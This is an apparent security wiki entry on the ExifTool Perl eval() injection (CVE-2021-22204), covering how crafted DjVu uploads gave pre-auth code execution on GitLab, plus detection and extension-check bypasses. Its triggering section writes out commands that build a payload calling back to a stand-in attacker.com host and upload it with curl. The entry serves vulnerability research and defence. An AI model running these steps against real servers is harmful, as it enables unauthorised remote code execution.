---
title: ExifTool Perl eval() Injection — Arbitrary Code Execution (CVE-2021-22204)
slug: exiftool-perl-eval-rce
created_utc: 2026-05-21T00:00:00Z
updated_utc: 2026-05-21T00:00:00Z
tags: [technique/server-side, technique/rce, technique/file-upload, technique/injection]
inbound: []
---

# ExifTool Perl eval() Injection — Arbitrary Code Execution (CVE-2021-22204)

## Pattern

ExifTool (versions < 12.24) passes attacker-controlled metadata from DjVu
files through a Perl `eval()` without sanitization. A crafted image file
that sets `annotations` or similar metadata fields to Perl-executable strings
causes ExifTool to execute arbitrary Perl code on the server when processing
the file. GitLab used ExifTool server-side to strip metadata from
user-uploaded images, making any file upload endpoint a pre-auth RCE vector.

## Preconditions

- Server runs a vulnerable ExifTool version (< 12.24) on user-supplied files.
- Attacker can upload or submit a file that reaches the ExifTool processing path.
- On GitLab: no authentication required — GitLab runs ExifTool on attachments
  even on public instances.

## Detection

- Version check: `exiftool -ver` returning < 12.24 is sufficient.
- Probe: upload a crafted DjVu file (PoC available publicly); observe whether
  an out-of-band callback (DNS / HTTP) fires.
- Check CI/CD pipelines that auto-process uploaded artifacts for ExifTool calls.

## Triggering

```bash
# Craft a malicious DjVu file
# The annotation field contains embedded Perl to execute
python3 exploit.py --host attacker.com --port 9001 > exploit.jpg

# Upload to GitLab as an attachment (pre-auth):
curl -F "file=@exploit.jpg" https://gitlab.example.com/uploads/user
```

The annotation metadata in the crafted DjVu/JPEG hybrid triggers Perl `eval()`
during ExifTool metadata parsing, executing the embedded payload.

## Bypasses

- The file extension check is irrelevant — ExifTool reads magic bytes, not the
  extension. Renaming the payload to `.jpg` or `.png` still triggers it.
- Signatures checking file headers still pass because the crafted file has
  valid JPEG/DjVu magic bytes.

## Seen in the wild

- 2021 (public PoC April 2021) — GitLab, $20,000. Pre-auth RCE on GitLab.com
  instances via image upload → ExifTool metadata stripping. Widely exploited
  in the wild shortly after PoC release. Disclosed on BBRE.
  [BBRE](https://www.youtube.com/watch?v=YYLqzj5-N7w)

## References

- CVE-2021-22204
- ExifTool changelog 12.24
- GitLab security advisory
- See also: [dependency-confusion](../supply-chain/dependency-confusion.md)
